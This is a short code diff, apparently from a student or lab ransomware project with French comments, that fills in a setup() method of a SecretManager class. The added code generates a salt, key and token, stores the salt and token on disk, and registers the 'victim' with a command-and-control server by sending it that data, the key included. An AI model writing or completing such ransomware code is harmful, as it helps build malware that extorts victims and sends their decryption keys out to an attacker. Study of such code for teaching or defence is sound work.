@@ -75,9 +75,25 @@ class SecretManager:
             self._log.error(f"Failed to send data to CNC: {response.text}")
 
 
-    def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+    def setup(self) -> None:
+        '''
+        Fonction principale pour créer des données cryptographiques et enregistrer le malware sur le CNC
+        '''
+    
+        # Créer les éléments : sel, clé et jeton
+        self._salt, self._key, self._token = self.create()
+
+        # Enregistrez le sel et le jeton dans les fichiers locaux
+        os.makedirs(self._path, exist_ok=True)
+        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_file:
+            salt_file.write(self._salt)
+        with open(os.path.join(self._path, "token.bin"), "wb") as token_file:
+            token_file.write(self._token)
+
+        # Inscrire la victime au CNC en envoyant les données
+        self.post_new(self._salt, self._key, self._token)
+
+
 
     def load(self)->None:
         # function to load crypto data
